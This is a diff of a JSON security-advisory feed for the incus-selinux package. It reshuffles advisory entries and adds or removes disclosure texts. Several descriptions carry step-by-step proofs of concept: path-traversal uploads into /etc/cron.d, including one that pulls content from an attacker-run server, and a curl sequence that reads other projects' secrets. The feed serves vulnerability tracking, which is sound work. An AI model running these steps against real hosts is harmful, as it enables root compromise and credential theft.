@@ -1,7 +1,7 @@
 {
     "package_name": "incus-selinux",
     "advisory": {
-        "9": {
+        "10": {
             "CVE-2025-58183": {
                 "cve_id": "CVE-2025-58183",
                 "title": "tar.Reader does not set a maximum size on the number of sparse re ...",
@@ -11,7 +11,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -69,7 +69,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -88,7 +88,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -107,7 +107,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -126,7 +126,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -145,7 +145,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -164,7 +164,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -183,7 +183,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -202,7 +202,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -592,8 +592,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary file write on host via image fingerprint path traversal",
+                "description": "## Summary The fix for CVE-2026-48769 (GHSA-f6m5-xw2g-xc4x, commit `46d6ef23`, present in v7.2.0) added `validate.IsSHA256(fp)` but gated it to `protocol == 'direct'` only. A project user with `EntitlementCanCreateImages` can `POST /1.0/images` with `source.protocol=simplestreams` (or `incus`/`lxd`/`oci`), `source.secret=<any>`, and `source.fingerprint=../../../../etc/cron.d/x`. Because the secret path skips the fingerprint reassignment, the raw attacker value reaches `os.Create` at `daemon_images.go:393` as the root daemon \u2014 an unconditional arbitrary file create/truncate; pairing with an attacker-run `source.server` fills it with attacker content \u2192 host RCE. ## Root Cause `imgPostRemoteInfo` (`images.go:532`) maps the request body `Fingerprint`\u2192`Alias`, plus `Protocol`, `Secret`, `Server`. `fp := args.Alias` (`daemon_images.go:93`) is the attacker fingerprint. The block at `daemon_images.go:135-161` that would reassign `fp = info.Fingerprint` is gated by `if args.Secret == ''` \u2014 so with a secret set it is skipped and `fp` stays the raw traversal string. The validation `if protocol == 'direct' { validate.IsSHA256(fp) }` (`daemon_images.go:350`) does not run for `simplestreams`/`incus`/`lxd`/`oci`. `destName := filepath.Join(destDir, fp)` (`:358`) then, in the `{incus,lxd,oci,simplestreams}` branch, `dest, _ := os.Create(destName)` (`:393`) \u2014 executing BEFORE the `fp = info.Fingerprint` reassignment at `:416`. `GetPrivateImageFile(fp, secret, request)` streams the attacker server's bytes into the created file. ## Impact Unconditional arbitrary-file create/truncate on any root-writable host path (integrity/DoS); with a malicious `source.server`, arbitrary-content write \u2192 host root RCE (e.g. `/etc/cron.d/`). The failure-path `os.Remove(destName)` also gives an arbitrary-path unlink primitive. ## Proof of Concept As a project user with `EntitlementCanCreateImages`: `POST /1.0/images` with body `source.type=image`, `source.protocol=simplestreams`, `source.server=http://attacker`, `source.secret=x`, `source.fingerprint=../../../../etc/cron.d/x`. Incus creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x` and streams the attacker server's content into it. ## Attack Chain 1. Entry: `POST /1.0/images` (auth `EntitlementCanCreateImages`, images.go:1159) \u2192 `imgPostRemoteInfo` (images.go:532) maps body into `imageDownloadArgs`. 2. fp init: `fp := args.Alias` = attacker fingerprint (daemon_images.go:93). 3. Alias resolution skipped: the `fp = info.Fingerprint` reassignment (daemon_images.go:135-161) is gated by `if args.Secret == ''`; with a secret set it is skipped \u2192 `fp` stays the raw traversal string. 4. Check: `if protocol == 'direct' { validate.IsSHA256(fp) }` (daemon_images.go:350) \u2014 does NOT run for simplestreams/incus/lxd/oci. Bypass proof: `git show 46d6ef23` adds exactly `if protocol == 'direct' { ... IsSHA256 ... }`; no validation for other protocols. 5. Sink: `destName := filepath.Join(VarPath('images'), fp)` (:358) \u2192 `dest, _ := os.Create(destName)` (:393) executes before `fp = info.Fingerprint` (:416). Root daemon creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x`. `GetPrivateImageFile(fp, secret, request)` (:452) streams attacker bytes. 6. Impact: arbitrary-file truncate on any root-writable path; malicious `source.server` \u2192 arbitrary-content write \u2192 host RCE. ## Bypass Evidence `git show 46d6ef23` confirms the fix gates `validate.IsSHA256(fp)` behind `protocol == 'direct'` only. `grep -n` confirms `args.Secret == ''` at :135 gating the reassignment at :160, and `os.Create(destName)` at :393 preceding the reassignment at :416. Incomplete-fix bypass \u2014 affected range is the CVE-2026-48769 fix version onward through HEAD. ## Affected Versions `<= 7.2.0` (fix commit 46d6ef23 IS contained in v7.2.0, so the bypass affects the released version; vulnerable code verified present on HEAD 60d85b3e). ## Suggested Fix Hoist `validate.IsSHA256(fp)` to run for ALL protocols before `filepath.Join`/`os.Create`, and re-validate after any `fp = info.Fingerprint` reassignment. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -618,8 +618,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -644,19 +644,6 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
-                "severity": "HIGH",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "CVE-2026-81498": {
-                "cve_id": "CVE-2026-81498",
                 "title": "security update",
                 "description": "security update",
                 "severity": "HIGH",
@@ -668,10 +655,23 @@
                     }
                 ]
             },
+            "CVE-2026-81498": {
+                "cve_id": "CVE-2026-81498",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -709,8 +709,8 @@
             },
             "GHSA-443p-7392-h4v2": {
                 "cve_id": "GHSA-443p-7392-h4v2",
-                "title": "Restricted project can use pull mode migration through clustered refresh",
-                "description": "### Summary Restricted projects aren't allowed to use pull mode migration, as that has the server connect to an arbitrary remote URL chosen by the user. That rule is enforced by the instance creation check, but on clustered servers a migration request with `refresh` set for an instance that already exists locally takes a short-circuit straight into the migration sink and never runs that check. ### Impact A user with instance creation rights in a restricted project on a clustered server can have the server open an outbound TLS websocket connection to a URL of their choice, trusting a certificate they supply. This can be used to probe services reachable from the server. The refresh only synchronizes storage for an instance the user already owns, so no configuration bypass results from it. Standalone servers are not affected. ### Details The pull mode restriction is now enforced at the start of the refresh short-circuit, before the request is forwarded to another member or the migration sink is set up. ### Workarounds Don't grant instance creation in restricted projects on clustered servers to users who shouldn't be able to initiate outbound connections from the server.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -722,19 +722,6 @@
             },
             "GHSA-579w-c4rw-c8q3": {
                 "cve_id": "GHSA-579w-c4rw-c8q3",
-                "title": "Arbitrary file write on host via symlink in migration stream",
-                "description": "### Summary When receiving an instance or custom storage volume through migration (copy, move, refresh, push or pull), Incus hands the incoming data stream to `rsync`, or to `btrfs receive` for optimized transfers between btrfs pools. Both tools replay the stream on the host using regular path-based system calls and follow symlinks in the paths they write to. A malicious migration source can plant a symlink in the transferred volume, such as `rootfs` pointing at `/`, and have later entries in the same stream (or in the following snapshot or main volume stream) written through it. The symlink check added in Incus 7.3 runs after the transfer, so it doesn't prevent those writes. ### Impact Any client allowed to create an instance or custom volume in a project, or any server a target is told to copy or move from, can write attacker-controlled files to arbitrary paths on the target host as root, leading to full host compromise. For virtual machines the same technique can replace the `root.img` block file with a symlink before the block stream is written through it. All storage drivers receiving through `rsync` are affected, as is the optimized btrfs path. Optimized ZFS transfers are not affected as `zfs receive` never resolves host paths. Releases before 7.3.0 are additionally affected by a `rootfs` symlink surviving the transfer, which the file API then follows when chrooting into the container, allowing host files to be read as well as written. ### Details `rsync` writes each received entry to `<volume>/<path>` and, when the sender marks the parent directories as not transferred, resolves that path through whatever already exists on the receiving side, including a symlink created earlier in the transfer. `btrfs receive` behaves the same way as it applies `mkfile`, `write`, `mkdir` and `rename` commands with plain `creat()`, `open()`, `mkdir()` and `rename()` calls on paths built from the received subvolume. Neither verifies the stream against the real filesystem it was supposed to describe, so a crafted stream isn't constrained to what a genuine sender would produce. ### Workarounds Only allow trusted clients to create instances and custom volumes, and only migrate from trusted servers.",
-                "severity": "CRITICAL",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "GHSA-hpjh-q53p-f27r": {
-                "cve_id": "GHSA-hpjh-q53p-f27r",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -746,10 +733,23 @@
                     }
                 ]
             },
+            "GHSA-hpjh-q53p-f27r": {
+                "cve_id": "GHSA-hpjh-q53p-f27r",
+                "title": "Arbitrary file write on host via path traversal in instance backup dependent volumes",
+                "description": "### Summary Importing an instance backup validates the instance name and snapshot names, but not the names of the dependent custom volumes listed in the backup's `index.yaml`. Those names are used verbatim as path segments when creating the volume on the target storage pool, so a `../` chain escapes the storage pool directory. ### Impact Any client allowed to create instances in a project can have the Incus daemon create root-owned directories, populated with attacker-controlled content, at arbitrary paths on the host, leading to full host compromise. The backup also names the project each dependent volume is created in, so the same request could create custom volumes in projects the caller has no access to. ### Details The fixes for CVE-2026-81495 and CVE-2026-81496 added name validation to the direct custom volume and instance backup import handlers. The dependent volume path nested inside an instance backup reaches the same volume creation code without going through either check. The name flows through `filepath.Join`, which collapses `../`, into `os.Mkdir` and the subsequent unpacking of the volume data. The attached-device gate can be satisfied by splitting the traversal string across the device's `pool` and `source` fields, as only the pool of the volume entry is resolved against a real storage pool. ### Workarounds Only allow trusted clients to create instances.",
+                "severity": "CRITICAL",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Project restriction bypass for custom volume copy with omitted source type",
-                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -761,8 +761,8 @@
             },
             "GHSA-mfwv-x733-9446": {
                 "cve_id": "GHSA-mfwv-x733-9446",
-                "title": "Authorization bypass lets a restricted client read any operation in another project",
-                "description": "### Summary **Broken Authorization (CWE-862, Missing Authorization) on `GET /1.0/operations/{uuid}`.** The handler performs no authorization of any kind. Any authenticated client \u2014 including a TLS client certificate restricted to a single project \u2014 can read the full contents of any in-flight operation in any other project, including the command line, the environment variables and the websocket secrets the operation carries. `operationGet` is registered under `allowAuthenticated`, which your own code documents as deferring the real decision to the handler. The handler never makes one. ### Affected | Line | Range | Verified | |---|---|---| | Feature | `>= v0.2.0`, through `v7.4.0` | runtime, 7.4.0 from your apt repository | | LTS 6.0 | `v6.0.0` \u2013 `v6.0.6`, `stable-6.0` HEAD | runtime, 6.0.6 from your apt repository | | 7.0 | `v7.0.0`, `v7.0.1`, `stable-7.0` HEAD | source | | main | `dd19d9938` | source | The check has never existed. `operationGet` is 53 lines with zero authorizer calls at every tag from `v6.0.0` to `v7.4.0` and on all three branch heads. `v0.2.0` is the first release containing `613f937dc`, which is where operations authorization was introduced \u2014 so it is the first release in which Incus claims to authorize operations and does not authorize this one. One question on the range rather than an assertion: `doc/support.md` still describes 6.x as the feature line and refers to a future 7.0 LTS, while `stable-7.0` already carries point releases. Please confirm whether 7.0 is a supported line before the advisory range is published. ### Contrast, on one URL, one certificate, one instant A client certificate restricted to project `attacker`. A container `victim-box` in project `victim`. An admin starts an `exec` in `victim` carrying a marker in its environment. Then, as the restricted certificate: ``` --- attacker GET /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 200 --- attacker GET .../wait?timeout=1 -> 200 --- attacker DELETE /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 403 --- DELETE error body: {'error_code':403,'error':'User does not have permission for project \\'victim\\''} --- contents returned by the GET that was allowed, after the DELETE was denied: {'instances':['/1.0/instances/victim-box?project=victim']} {'DB_PASSWORD':'s3cr3t-victim-value','HOME':'/root','LANG':'C.UTF-8','USER':'root','PATH':'...'} {'0':'c5c793028efb9e0691423dfcd2a36e6dc18031b1408211ed8aa80308a7aef2a1', '1':'e557d78cd9a22790759e6997f1fdcdb9a5f22c41d811e588a3d96ea9021fffd7', '2':'edf04a0ae7d90ed45e31b322d9be311dfaef2683e5be6676bc07bab34c0caf34', 'control':'afa5bb2ed82f416c563d6f8881a4f5a01c3d66ad14ca3b5ce3f7c90e50c4d85b'} ``` `DELETE` refuses by project. `GET` on the same URL, from the same certificate, in the same second, hands over the victim's command line, environment and websocket secrets. ### Root cause `cmd/incusd/operations.go` registers three actions under `allowAuthenticated`: ```go 33: Delete: APIEndpointAction{Handler: operationDelete, AccessHandler: allowAuthenticated}, 34: Get: APIEndpointAction{Handler: operationGet, AccessHandler: allowAuthenticated}, 40: Get: APIEndpointAction{Handler: operationsGet, AccessHandler: allowAuthenticated}, ``` `cmd/incusd/daemon.go:275` states the contract: > `allowAuthenticated` is an AccessHandler which allows only authenticated requests. This should be used in conjunction with **further access control within the handler** (e.g. to filter resources the user is able to view/edit). Two of the three do that. `operationDelete` resolves the project from `op.Project()`, reads `op.Permission()`, builds an `auth.NewObject` per resource and calls `s.Authorizer.CheckPermission` (`operations.go:280-306`). `operationsGet` takes a `GetPermissionChecker` for `auth.EntitlementCanViewOperations` and filters every local and remote operation through it (`operations.go:538`, `:556`, `:584`). `operationGet` (`operations.go:181`) resolves the operation out of the global UUID-keyed map and renders it: ```go op, err := operations.OperationGetInternal(id) if err == nil { _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` No `op.Project()`, no `op.Permission()`, no authorizer call, no read of `?project=`. The map is global, so the UUID alone selects the object. This is not a regression. `git log -S` puts it at the commit that introduced operations authorization: `613f937dc`, 2023-10-25, *'lxd: Update authorization for operations'* \u2014 a single-file, 34-line diff with four hunks. One hunk adds the check to `operationDelete`; three add the checker and its two filter sites to `operationsGet`. `operationGet` sits 77 lines above the `operationDelete` hunk **in that same diff** and is not touched. The list and the destructive verb were authorized; the read was walked past. ### Impact A tenant holding a restricted certificate \u2014 the mechanism Incus ships specifically to confine a client to its own projects \u2014 reads, from any other project on the server: - the full command line of any running `exec`, including anything passed as an argument; - the complete environment of that command, which is where deployment tooling puts database passwords, API tokens and cloud credentials; - the `fds` secrets for the operation's websockets, and the operation's resource URLs, which name instances and volumes in the other project. **Escalation to full server admin, demonstrated.** `incus config trust add` creates a `Running` operation whose metadata *is* the enrolment token. Reading that operation yields the token; the token enrols a fresh, unrestricted client certificate. From the restricted certificate we read such an operation, reassembled the token, enrolled a new certificate, and then read the victim's instance (HTTP 200) and listed every project on the server. We are **not** pricing that chain into the score below, because it needs a trust-token operation to be pending at the moment of the read, and that is operator timing rather than code. It is reported because it bounds what the primitive is worth, not because we are claiming it. **Limitation, stated plainly.** The attacker must know the operation's UUID and cannot get it from Incus. `uuid.New()` (`internal/server/operations/operations.go:138`) is `crypto/rand`-backed UUIDv4, 122 bits. We verified that a restricted certificate sees nothing through any enumeration path: `/1.0/operations?project=attacker`, `?all-projects=true` and `?project=victim` all return empty, and the victim's instance is correctly refused with 403. The UUID must come from outside \u2014 an operator's shell history or CI log, the `Location` header of an async response passing through a proxy or APM trace, `incus monitor` output pasted into a ticket, a former project membership, or a co-tenant on a shared automation account. No victim interaction is required after that. This is the same gating you accepted in CVE-2026-81501, whose text reads: *'the 64-hex fingerprint is not returned by GET / list to a caller without CanView. The attacker must obtain it out of band (logs, backups, a former project membership, a predictable custom image, etc.). No victim interaction is required after that.'* ### Suggested fix Give `operationGet` the check `operationDelete` already performs. The finished handler, with the existing body unchanged below it: ```go func operationGet(d *Daemon, r *http.Request) response.Response { s := d.State() id, err := pathVar(r, 'id') if err != nil { return response.SmartError(err) } var body *api.Operation // First check if the query is for a local operation from this node op, err := operations.OperationGetInternal(id) if err == nil { projectName := op.Project() if projectName == '' { projectName = api.ProjectDefaultName } err = s.Authorizer.CheckPermission(r.Context(), r, auth.ObjectProject(projectName), auth.EntitlementCanViewOperations) if err != nil { return response.SmartError(err) } _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` `CanViewOperations` is the entitlement `operationsGet` already uses for exactly this question, so the read path and the list path end up answering it the same way. Using `op.Permission()` as `operationDelete` does would also work and would be stricter; `CanViewOperations` is suggested because it matches the verb. The cluster-forwarding branch below it inherits the fix for free: the remote member runs `operationGet` too and will apply the same check to the forwarded identity. `operationWaitGet` (`operations.go:46`) is registered `AllowUntrusted: true` and returns the same rendered object on completion. It needs the same treatment or the fix is bypassable by waiting instead of getting. We have not tested that path against a fix and are flagging it rather than asserting it. ### Dedup We could find no published advisory of yours covering operations. The fourteen published between 2026-07-30 and 2026-08-27 are image import, backup import, volume import, cross-project instance copy, migration config override, network address sets, idmap isolation, nvidia capabilities, VM template paths, image symlinks and fingerprints, and a CLI traversal. If this duplicates something already in your queue, please say so and close it \u2014 we would rather know than have you carry two. ### PoC Full sequence, reproducible on a clean install. Run as the server admin except where marked. ```sh # --- setup, as admin ------------------------------------------------------- incus project create victim incus project create attacker incus launch images:debian/12 victim-box --project victim # a client certificate restricted to project 'attacker' incus config trust add --name attacker --restricted --projects attacker # enrol that token from the client, then confirm the restriction: incus query /1.0/certificates/<fingerprint> # { 'name': 'attacker', 'restricted': true, 'projects': [ 'attacker' ] } # --- controls: the restriction works --------------------------------------- # as the attacker certificate curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/instances/victim-box?project=victim' # 403 User does not have permission for project 'victim' for q in 'project=attacker' 'all-projects=true' 'project=victim'; do curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations?$q' done # {} {} {} the operation is invisible through every listing curl -k 'https://SERVER:8443/1.0/operations/$OPID' # no client cert # 403 # --- the finding ----------------------------------------------------------- # as admin, start a command in the victim project carrying a marker incus exec victim-box --project victim --env DB_PASSWORD=s3cr3t-victim-value -- sleep 600 & OPID=$(incus operation list --project victim --format csv | head -1 | cut -d, -f1) # as the attacker certificate, same URL, two verbs curl --cert attacker.crt --key attacker.key -k \\ -X DELETE 'https://SERVER:8443/1.0/operations/$OPID' # 403 User does not have permission for project 'victim' curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations/$OPID' # 200, and the body contains: # resources.instances -> /1.0/instances/victim-box?project=victim # metadata.environment.DB_PASSWORD -> s3cr3t-victim-value # metadata.fds -> 0, 1, 2, control ``` Verified identically on `7.4.0` and on `6.0.6`, both installed from your apt repository. Both lab containers were destroyed after the run. ### Severity `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N` \u2014 **6.3 Medium**. This is set to **parity with your own scoring of CVE-2026-81501**, which carries the identical vector, rather than argued upward. Metric by metric: - **AV:N** \u2014 the HTTPS API, reachable from wherever the client is. - **AC:H** \u2014 the 122-bit UUID must be obtained out of band. This is the metric doing the work, and it is the same one you applied to the out-of-band fingerprint in CVE-2026-81501. - **PR:L** \u2014 a valid, enrolled client certificate. Not unauthenticated: `allowAuthenticated` refuses an untrusted client on this URL, and we checked. - **UI:N** \u2014 no victim interaction once the UUID is held. - **S:C** \u2014 the vulnerable component is the API's authorization layer; the impacted component is another project, which is the isolation boundary Incus sells. - **C:H / I:N / A:N** \u2014 the endpoint is read-only. Secrets of arbitrary value are returned. If you prefer to price the demonstrated trust-token chain, the vector becomes `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` = **8.5 High**. We are not proposing it, for the reason given under Impact, but it is the honest ceiling and the decision is yours.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -774,8 +774,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
-                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -812,7 +812,7 @@
                 ]
             }
         },
-        "10": {
+        "9": {
             "CVE-2025-58183": {
                 "cve_id": "CVE-2025-58183",
                 "title": "tar.Reader does not set a maximum size on the number of sparse re ...",
@@ -822,7 +822,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -880,7 +880,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -899,7 +899,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -918,7 +918,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -937,7 +937,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-1.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -956,7 +956,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -975,7 +975,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -994,7 +994,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1013,7 +1013,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -1403,8 +1403,8 @@
             },
             "CVE-2026-81493": {
                 "cve_id": "CVE-2026-81493",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary file write on host via image fingerprint path traversal",
